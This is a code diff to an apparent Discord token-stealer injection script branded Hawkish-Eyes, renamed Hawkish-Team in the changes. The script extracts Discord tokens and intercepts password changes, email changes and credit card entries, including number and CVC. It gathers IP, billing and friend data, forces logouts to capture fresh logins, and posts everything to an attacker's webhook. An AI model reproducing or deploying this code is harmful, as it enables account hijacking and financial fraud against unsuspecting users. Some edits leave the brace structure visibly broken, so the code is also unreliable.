@@ -7,8 +7,9 @@ const queryString = require("querystring")
 
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
-var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
+var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
 var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
+
 
 var config = {
     "logout": "true",
@@ -46,12 +47,16 @@ var config = {
 };
 
 
+
+
+
 async function execScript(str) {
     var window = electron.BrowserWindow.getAllWindows()[0]
     var script = await window.webContents.executeJavaScript(str, true)
     return script || null
 
 }
+
 
 const makeEmbed = async ({
     title,
@@ -61,8 +66,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Hawkish-Eyes",
-        avatar_url: "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/hawkish-removebg-preview.png",
+        username: "Hawkish-Team",
+        avatar_url: "https://raw.githubusercontent.com/Hawkishx/assets/main/hawkish.png",
         content: "",
         embeds: [{
             title: title,
@@ -70,11 +75,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Hawkish-Eyes`
+                name: `Hawkish-Team`
             },
             
             footer: {
-                text: `©[${config.creator}] | https://github.com/Inplex-sys/Hawkish-Eyes`
+                text: `©[${config.creator}] | https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook`
             },
 
         }]
@@ -116,7 +121,7 @@ const getGifOrPNG = async (url) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
 }
 const GetRBadges = (e) => {
     var n = "";
@@ -143,6 +148,7 @@ const GetA2F = (bouki) => {
             return "Idk bro you got me"
     }
 }
+
 async function getDiscordClientFolder() {
     const parts = __dirname.split('\\');
     let discordclient;
@@ -210,6 +216,11 @@ const GetNitro = r => {
     }
 }
 
+
+
+
+
+
 function GetLangue(read) {
     var languages = {
         "fr": ":flag_fr: French",
@@ -254,6 +265,8 @@ const post = async (params) => {
         token: token
     });
     [config.webhook].forEach(res => {
+        if(res == "%API_URL%")return;
+        if(res == "%WEBHOOK%")return;
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -274,17 +287,20 @@ const post = async (params) => {
 
 }
 
-
 const FirstTime = async () => {
-    if (doTheLogOut) return false
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/Hawkish")) fs.rmdirSync(__dirname + "/Hawkish")
+    if (fs.existsSync(__dirname + "/Hawkish")){
+        try{
+        fs.rmdirSync(__dirname + "/Hawkish")
+        }catch(err){
+            console.log(err)
+        }
     var ip = await getIP()
     var client_discord = await getDiscordClientFolder()
     if (!token) {
         var params = await makeEmbed({
-            title: "Hawkish-Eyes Initialized",
+            title: "Hawkish-Team Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -299,13 +315,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/ghost-eye.gif"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/banner.gif"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkishx/assets/main/ghost.png"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkishx/assets/main/banner.gif"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "Hawkish-Eyes Initialized",
+            title: " Hawkish-Team Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -337,7 +353,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Hawkish-Eyes 2023 <:hwkish:1104091524758773822>](https://github.com/hawkish-Eyes/Hawkish-Eyes)`,
+                value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                 inline: !0
             }, {
                 name: "Hawkished Files",
@@ -392,8 +408,8 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/ghost-eye.gif"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/banner.gif"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkishx/assets/main/ghost.png"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkishx/assets/main/banner.gif"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -430,7 +446,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Hawkish-Eyes 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes)`,
+                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                     inline: !0
                 }, {
                     name: "Hawkished Files",
@@ -470,12 +486,15 @@ const FirstTime = async () => {
 
             params.embeds.push(params2.embeds[0])
         }
+    
         fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
         await execScript(logOutScript)
         doTheLogOut = true
         await post(params)
     }
+     
     return false
+}
 }
 
 const path = (function () {
@@ -494,6 +513,7 @@ const checUpdate = () => {
         appPath,
         appName
     } = path
+    if (!doTheLogOut) execScript(logOutScript)
 
     var ressource = `${appPath}/app`
     var indexFile = __filename.replace(/\\/g, "/")
@@ -523,7 +543,6 @@ function init() {
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
     fs.writeFileSync(index, script)
-    if (!doTheLogOut) execScript(logOutScript)
     return
 }
 electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
@@ -563,8 +582,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/ghost-eye.gif"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/banner.gif"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkishx/assets/main/ghost.png"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkishx/assets/main/banner.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -610,7 +629,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Hawkish-Eyes 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes)`,
+                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                     inline: !0
                 }, {
                     name: "Hawkished Files",
@@ -662,7 +681,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Hawkish-Eyes Detect Password Changed",
+                    title: "Hawkish-Team Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -695,7 +714,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Hawkish-Eyes 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes)`,
+                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                         inline: !0
                     }, {
                         name: "Hawkished Files",
@@ -749,7 +768,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Hawkish-Eyes Detect Email Changed",
+                    title: "Hawkish-Team Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -782,7 +801,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Hawkish-Eyes 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes)`,
+                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                         inline: !0
                     }, {
                         name: "Hawkished Files",
@@ -835,7 +854,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Hawkish-Eyes User Credit Card Added",
+                title: "Hawkish-Team User Credit Card Added",
                 description: `
                 Hawkished Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                 **IP:** ${ip}\n\n
